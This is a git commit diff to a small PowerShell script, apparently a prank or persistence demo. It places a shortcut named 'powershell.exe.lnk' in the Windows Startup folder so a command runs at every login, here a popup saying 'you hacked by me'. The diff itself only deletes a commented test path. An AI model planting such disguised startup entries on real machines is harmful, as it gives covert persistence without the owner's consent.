0b356cd3922978c3b1fccd32a3a647ee25cf80f1
MINIBEEF <rjsdid7325@naver.com>
2020-09-15 14:47:56 +0900

    2020 09 15

--- drop-cmd-at-startup-program.ps1
+++ drop-cmd-at-startup-program.ps1
@@ -3,7 +3,6 @@ $SourceCommand = @'
 -Command "$wsh = New-Object -ComObject Wscript.Shell; $wsh.Popup('you hacked by me');"
 '@
 
-# $ShortcutLocation = 'C:\Users\miny7\Desktop\powershell_test.lnk'
 $ShortcutLocation = $env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\powershell.exe.lnk'
 
 $WScriptShell = New-Object -ComObject WScript.Shell
